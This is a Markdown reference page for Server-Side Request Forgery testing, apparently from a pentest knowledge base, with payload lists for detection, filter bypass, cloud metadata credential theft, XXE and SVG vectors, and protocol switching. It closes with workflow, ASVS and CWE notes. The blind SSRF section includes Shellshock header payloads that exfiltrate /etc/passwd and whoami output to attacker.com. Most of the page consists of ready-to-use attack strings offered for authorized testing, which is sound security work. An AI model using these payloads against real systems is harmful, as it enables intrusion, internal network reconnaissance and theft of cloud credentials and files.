---
id: PS-SSRF
category: Server-side request forgery (SSRF)
lab_count: 7
wstg_refs: [WSTG-INPV-19]
---

# Server-Side Request Forgery (SSRF): Attack Technique Reference

SSRF occurs when an application fetches a remote resource based on a user-supplied URL without adequate validation. The attacker manipulates the server into making HTTP requests to arbitrary destinations, including internal services, cloud metadata endpoints, and other back-end systems that are not directly accessible from the internet.

---

## 1. Detection

### 1A. Identify SSRF-Susceptible Parameters

Look for any parameter that accepts a URL, hostname, IP address, or partial URL:

- Full URL parameters: `url=`, `uri=`, `link=`, `src=`, `href=`, `path=`, `dest=`, `redirect=`
- API-style: `stockApi=`, `callback=`, `webhook=`, `endpoint=`, `feed=`
- Partial URLs: `host=`, `domain=`, `server=`, `next=`, `site=`
- File fetch: `img=`, `image=`, `file=`, `document=`, `page=`
- PDF/screenshot generators: `target=`, `screenshot=`, `render=`

### 1B. Canary Detection

Replace the parameter value with a URL to an attacker-controlled server:

```
# HTTP callback
stockApi=http://attacker-server.com/ssrf-test
url=http://OOB-CALLBACK-SUBDOMAIN

# DNS-only callback (works even when HTTP is blocked)
stockApi=http://ssrf-test.attacker.com
```

If you receive an HTTP request or DNS lookup from the target server, SSRF is confirmed.

### 1C. Internal Access Test

Attempt to access the loopback address to confirm the server makes the request:

```
stockApi=http://127.0.0.1/
stockApi=http://localhost/
stockApi=http://127.0.0.1:8080/admin
```

---

## 2. Techniques

### 2A. Basic SSRF Against the Local Server

The application makes a request to a URL on the server itself. Administrative interfaces and internal endpoints are often accessible from localhost without authentication.

```
# Access admin panel via loopback
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
stockApi=http://127.0.0.1:8080/admin
stockApi=http://[::1]/admin

# Delete a user via admin API
stockApi=http://localhost/admin/delete?username=carlos
```

**Why it works:** Trust relationships often allow requests from the local machine to bypass access controls. Many admin panels check only that the request originates from localhost.

> Lab refs: PS-SSRF-01

### 2B. SSRF Against Back-End Systems

Internal network services on private IP ranges are not accessible from the internet but can be reached by the server.

```
# Scan common internal ranges
stockApi=http://192.168.0.1/admin
stockApi=http://192.168.0.68/admin
stockApi=http://10.0.0.1/
stockApi=http://172.16.0.1/

# Port scanning via SSRF
stockApi=http://192.168.0.1:22        # SSH
stockApi=http://192.168.0.1:3306      # MySQL
stockApi=http://192.168.0.1:6379      # Redis
stockApi=http://192.168.0.1:9200      # Elasticsearch
stockApi=http://192.168.0.1:27017     # MongoDB
```

**Internal network scanning:** Iterate over private IP ranges (192.168.0.0/24, 10.0.0.0/8, 172.16.0.0/12) to discover internal services. Response differences (status codes, response sizes, timing) reveal live hosts and open ports.

> Lab refs: PS-SSRF-02

### 2C. Blind SSRF with Out-of-Band Detection

The response from the back-end request is not returned to the attacker. Confirm the vulnerability using out-of-band callbacks.

```
# Basic OOB detection
stockApi=http://OOB-CALLBACK-SUBDOMAIN

# DNS-only detection (when HTTP is blocked)
stockApi=http://ssrf-test.attacker.com
```

**Blind SSRF exploitation strategies:**

1. **Internal network recon:** Issue requests to internal IP ranges. Differentiate live vs dead hosts by response time differences.
2. **Shellshock exploitation:** If internal services run vulnerable CGI scripts, inject Shellshock payloads in HTTP headers:
   ```
   User-Agent: () { :; }; /usr/bin/nslookup $(whoami).attacker.com
   Referer: () { :; }; curl http://attacker.com/$(cat /etc/passwd | base64)
   ```
3. **Protocol smuggling:** Use different URL schemes to interact with non-HTTP services.

> Lab refs: PS-SSRF-03, PS-SSRF-06

---

## 3. Filter Bypass Techniques

### 3A. Blacklist Bypass

When the application blocks known malicious hosts like `127.0.0.1` or `localhost`:

**Alternative IP Representations for 127.0.0.1:**

| Format | Value |
|--------|-------|
| Decimal | `2130706433` |
| Hex | `0x7f000001` |
| Octal | `017700000001` |
| Shortened | `127.1` |
| IPv6 loopback | `[::1]` |
| IPv6 mapped | `[::ffff:127.0.0.1]` |
| Zero prefix | `127.000.000.001` |
| Hex per-octet | `0x7f.0x0.0x0.0x1` |
| Mixed | `127.0x0.0.1` |

```
# All of these resolve to 127.0.0.1
stockApi=http://2130706433/admin
stockApi=http://017700000001/admin
stockApi=http://0x7f000001/admin
stockApi=http://127.1/admin
stockApi=http://[::1]/admin
stockApi=http://[::ffff:127.0.0.1]/admin
stockApi=http://127.000.000.001/admin
```

**Keyword bypass (when "admin" is blocked):**

```
# URL encoding
stockApi=http://127.0.0.1/%61%64%6d%69%6e
stockApi=http://127.0.0.1/%41dmin

# Double URL encoding
stockApi=http://127.0.0.1/%2561%2564%256d%2569%256e

# Case variation
stockApi=http://127.0.0.1/Admin
stockApi=http://127.0.0.1/ADMIN
stockApi=http://127.0.0.1/aDmIn
```

**DNS-based bypass:**

```
# Register a domain that resolves to 127.0.0.1
stockApi=http://spoofed.attacker.com/admin
# where spoofed.attacker.com has A record → 127.0.0.1

# Use nip.io / sslip.io services
stockApi=http://127.0.0.1.nip.io/admin
stockApi=http://127-0-0-1.sslip.io/admin
```

> Lab refs: PS-SSRF-04

### 3B. Whitelist Bypass

When the application validates that the URL starts with an expected hostname, exploit URL parsing inconsistencies.

**Credential embedding (@):**
```
# Parser may extract "expected-host" but request goes to evil-host
stockApi=http://expected-host@evil-host/path
stockApi=http://expected-host:fakepassword@evil-host/
```

**Fragment injection (#):**
```
# Parser may match "expected-host" in fragment, request goes to evil-host
stockApi=http://evil-host#expected-host
stockApi=http://evil-host%23expected-host
```

**DNS hierarchy:**
```
# Subdomain of attacker domain
stockApi=http://expected-host.evil-host.com/
```

**URL encoding of parsing characters:**
```
# Double-encode the @ sign
stockApi=http://localhost%2523@expected-host/admin

# Combine techniques
stockApi=http://localhost%23@expected-host/admin
```

**Combined techniques (most effective):**
```
# Stack multiple bypass methods
stockApi=http://expected-host@127.0.0.1#expected-host/admin
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

> Lab refs: PS-SSRF-07

### 3C. Open Redirect Chaining

When direct SSRF is blocked but the application has an open redirect vulnerability, chain them together:

```
# Step 1: Find an open redirect on the trusted domain
GET /product/nextProduct?currentProductId=1&path=http://evil.com
# Returns 302 redirect to http://evil.com

# Step 2: Use the redirect URL as the SSRF payload
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin

# The server validates weliketoshop.net (trusted), follows the redirect to internal host
```

The application validates the initial hostname (which is trusted), then follows the redirect to the attacker-controlled destination.

> Lab refs: PS-SSRF-05

### 3D. Protocol Switching

```
# File protocol for local file read
stockApi=file:///etc/passwd
stockApi=file:///c:/windows/win.ini

# Gopher protocol for arbitrary TCP
stockApi=gopher://127.0.0.1:25/_HELO+attacker.com

# Dict protocol for service probing
stockApi=dict://127.0.0.1:6379/info

# FTP
stockApi=ftp://127.0.0.1/
```

---

## 4. Target Payloads

### 4A. Cloud Metadata Endpoints

| Cloud Provider | Metadata URL | Notes |
|----------------|-------------|-------|
| AWS EC2 | `http://169.254.169.254/latest/meta-data/` | IMDSv1 (no auth) |
| AWS EC2 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IAM role credentials |
| AWS EC2 | `http://169.254.169.254/latest/user-data` | Instance startup script |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` header |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires `Metadata: true` header |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | No auth required |
| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` | No auth required |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | No auth required |

**AWS credential theft chain:**
```
# 1. List IAM roles
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get credentials for the role
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token
```

### 4B. Common Internal Services

```
# Admin panels
http://127.0.0.1/admin
http://127.0.0.1:8080/manager/html         # Tomcat
http://127.0.0.1:9200/_cluster/health       # Elasticsearch
http://127.0.0.1:15672/api/overview         # RabbitMQ
http://127.0.0.1:8500/v1/agent/self         # Consul
http://127.0.0.1:2375/version               # Docker API (unauth)

# Databases
http://127.0.0.1:6379/                      # Redis
http://127.0.0.1:11211/                     # Memcached
http://127.0.0.1:5984/_all_dbs             # CouchDB

# Kubernetes
http://127.0.0.1:10255/pods                 # Kubelet (read-only)
http://127.0.0.1:10250/pods                 # Kubelet (read-write)
https://kubernetes.default.svc/             # K8s API
```

---

## 5. SSRF via Alternative Vectors

### 5A. Referer Header SSRF

Analytics and logging software may fetch URLs from the Referer header:

```
GET /product?id=1 HTTP/1.1
Host: target.com
Referer: http://attacker.com/ssrf-test
```

If the application processes the Referer for analytics (e.g., tracking referral sources), the server may make a request to the attacker-controlled URL.

### 5B. XML/XXE-Based SSRF

If the application parses XML input, inject an external entity that triggers a server-side request:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
```

### 5C. Partial URL Injection

When the application constructs URLs from partial user input:

```
# If the app builds: http://backend.internal/{user-input}
# Inject: @evil.com/
# Result: http://backend.internal/@evil.com/ → requests evil.com

# If the app builds: http://{user-input}.internal.api/
# Inject: attacker.com#
# Result: http://attacker.com#.internal.api/ → requests attacker.com
```

### 5D. SSRF via File Uploads

SVG files can contain SSRF payloads processed during server-side rendering:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

### 5E. Content-Type Manipulation

Change the Content-Type to trigger XML parsing on endpoints that normally accept form data:

```
POST /api/check HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">]>
<data>&xxe;</data>
```

---

## 6. Quick Reference: SSRF Payloads

### Loopback Access (bypass blacklists)

```
http://127.0.0.1/admin
http://localhost/admin
http://127.1/admin
http://2130706433/admin
http://0x7f000001/admin
http://017700000001/admin
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin
http://127.0.0.1.nip.io/admin
http://0/admin
```

### Internal Network Scan

```
http://192.168.0.X/admin         (X = 1-254)
http://10.0.0.X/admin            (X = 1-254)
http://172.16.0.X/admin          (X = 1-254)
```

### Cloud Metadata Theft

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/project/attributes/
```

### Filter Bypass Stack

```
http://localhost%2523@allowed-host.com/admin
http://allowed-host@127.0.0.1/admin
http://127.0.0.1%23@allowed-host.com/admin
http://allowed-host.com/redirect?url=http://127.0.0.1/admin
```
## Rynix workflow

1. `get_technique_guide` for `ssrf` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

